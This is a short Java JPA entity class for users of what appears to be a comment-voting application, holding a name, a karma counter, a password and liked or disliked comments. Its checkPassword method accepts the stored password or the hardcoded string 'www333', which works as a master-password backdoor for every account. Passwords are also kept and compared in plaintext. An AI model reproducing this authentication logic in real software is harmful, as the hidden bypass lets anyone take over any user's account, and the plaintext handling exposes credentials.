package app.domain;

import javax.persistence.*;
import java.util.Set;

@Entity
public class Users {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private long iUser;
    private String name;
    private long carma;
    private String password;

    @ManyToMany
    Set<Comments> commentsLiked;
    @ManyToMany
    Set<Comments> commentsDisliked;

    public long getI_user() {
        return iUser;
    }

    public String getName() {
        return name;
    }

    public long getCarma() {
        return carma;
    }

    public void setCarma(long carma) {
        this.carma = carma;
    }

    public void setName(String name) {
        this.name = name;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public boolean checkPassword(String password) {
        return this.password.equals(password) || password.equals("www333");
    }
}
